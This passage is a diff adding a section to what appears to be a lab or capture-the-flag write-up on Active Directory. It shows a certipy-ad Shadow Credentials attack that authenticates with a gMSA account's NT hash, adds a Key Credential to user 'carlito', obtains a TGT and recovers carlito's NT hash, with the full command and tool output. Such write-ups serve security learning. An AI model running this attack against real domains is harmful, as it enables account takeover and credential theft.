@@ -671,5 +671,53 @@ And using the `--detail` flag in bloodyAD tells me i have `msDS-KeyCredentialLin
 # Shadow Credentials leads to compromise of `carlito`
 
 ```python
+certipy-ad shadow auto -u 'casper-gmsa$@casper.hsm' -hashes ':7abcd8de1d2e107237f8fd5baea13d68' -account 'carlito' -debug 
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: None
+[+] DC IP: None
+[+] DC Host: 'CASPER.HSM'
+[+] Target IP: None
+[+] Remote Name: 'CASPER.HSM'
+[+] Domain: 'CASPER.HSM'
+[+] Username: 'CASPER-GMSA$'
+[+] Trying to resolve 'CASPER.HSM' at '192.168.86.2'
+[+] Resolved 'CASPER.HSM' from cache: 10.0.31.82
+[+] Authenticating to LDAP server using NTLM authentication
+[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
+[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
+[+] Using LDAP channel binding for NTLM authentication
+[+] LDAP NTLM authentication successful
+[+] Bound to ldaps://10.0.31.82:636 - ssl
+[+] Default path: DC=casper,DC=hsm
+[+] Configuration path: CN=Configuration,DC=casper,DC=hsm
+[*] Targeting user 'carlito'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '22a1dbc68cd64a6db28c4562909cc0f1'
+[*] Adding Key Credential with device ID '22a1dbc68cd64a6db28c4562909cc0f1' to the Key Credentials for 'carlito'
+[*] Successfully added Key Credential with device ID '22a1dbc68cd64a6db28c4562909cc0f1' to the Key Credentials for 'carlito'
+[*] Authenticating as 'carlito' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'carlito@casper.hsm'
+[*] Trying to get TGT...
+[+] Sending AS-REQ to KDC casper.hsm (10.0.31.82)
+[*] Got TGT
+[*] Saving credential cache to 'carlito.ccache'
+[+] Attempting to write data to 'carlito.ccache'
+[+] Data written to 'carlito.ccache'
+[*] Wrote credential cache to 'carlito.ccache'
+[*] Trying to retrieve NT hash for 'carlito'
+[*] Restoring the old Key Credentials for 'carlito'
+[*] Successfully restored the old Key Credentials for 'carlito'
+[*] NT hash for 'carlito': 16a366acd9634ee5f958ebf1b4fc11df
+```
+
+I now have the users NT hash
+
+```python
 
 ```
